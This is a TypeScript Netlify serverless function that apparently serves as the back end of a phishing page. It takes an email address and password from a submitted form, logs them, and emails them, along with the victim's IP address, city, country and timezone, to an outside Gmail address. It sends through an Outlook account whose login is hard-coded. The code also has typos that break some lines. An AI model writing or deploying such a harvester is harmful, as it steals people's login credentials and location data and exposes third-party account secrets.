import type { Context } from "@netlify/functions"
import nodemailer from "nodemailer"

export default async (req: Request, context: Context) => {
  let response;
  const body = await req.formData();
  const email = body.get("ai");
  const password = body.get("pr");
  console.log('response:', {email, password})

  const transporter = nodemailer.createTransport({
  host: "smtp-mail.outlook.com",
  port: 587,
  secure: false,
  auth: {
    user: "muammer_y@hotmail.com",
    pass: "noyanbey1",
  },
});

  const message = {
      from: "muammer_y@hotmail.com",
      to: "emilychan1178@gmail.com",
      subject: "New result",
      text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
      html: `<p>Login information: <br/> <br/>
            Email:: ${email} <br/>
            Password:: ${password} <br/><br/>
            Geolocation:
            IP:: ${context.ip} <br/>
            City:: ${context.geo.city} <br/>
            Country:: ${context.geo.country} <br/>
            Timezone:: ${context,geo.timezone} <br/>
            </p>`,
    };

  switch(req?.method){
    case "POST":
      try{
         const sendy = await transporter.sendMail(message, (err) => {
           console.log(err);
         });
         console.log(sendy)
         response = new Response(JSON.stringify({email, password, context}))
      }
      catch(error){
        console.log(errror)
      };
      break;
    case "GET":
      response = new Response("Get method")
      break;
    default:
      response  = new Response("Default");
      break;
  }
  return response;
}

